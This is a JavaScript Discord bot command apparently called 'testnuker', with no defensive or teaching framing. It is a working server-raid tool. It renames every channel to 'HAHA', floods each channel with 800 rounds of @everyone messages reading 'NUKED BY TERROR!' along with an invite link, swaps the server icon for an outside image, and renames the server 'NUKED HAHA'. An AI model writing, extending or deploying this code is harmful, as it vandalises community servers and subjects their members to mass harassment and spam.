const { SlashCommandBuilder } = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('testnuker')
    .setDescription('Rename all channels and nuke the server.'),
  async execute(interaction) {
    try {
      const guild = interaction.guild;

      // Rename all channels
      guild.channels.cache.forEach(async (channel) => {
        await channel.setName('HAHA')
          .then((updatedChannel) => console.log(`Updated channel name: ${updatedChannel.name}`))
          .catch((error) => console.error(error));
      });

      // Get the @everyone mention
      const everyoneMention = interaction.guild.roles.everyone.toString();

      // Send the nuke message and mention everyone in each channel
      for (let i = 0; i < 800; i++) {
        const message = `${everyoneMention}\n\nNUKED BY TERROR!\n\nJoin the chaos:\nhttps://discord.gg/jebhWzp7yx`;
        guild.channels.cache.forEach(async (channel) => {
          try {
            await channel.send(message);
          } catch (error) {
            console.error(`Failed to send message in channel: ${channel.id}`);
          }
        });
      }

      // Change server icon
      await guild.setIcon('https://cdn.discordapp.com/attachments/1122632442860286163/1126414144514572402/S.png')
        .catch(error => {
          console.error('Failed to set server icon:', error);
        });

      // Change server name
      await guild.setName('NUKED HAHA')
        .catch(error => {
          console.error('Failed to set server name:', error);
        });

      await interaction.reply({ content: 'Server nuked successfully!', ephemeral: true });
    } catch (error) {
      console.error(error);

      try {
        await interaction.reply({ content: 'There was an error while executing this command!', ephemeral: true });
      } catch (replyError) {
        console.error('Failed to send reply:', replyError);
      }
    }
  },
};
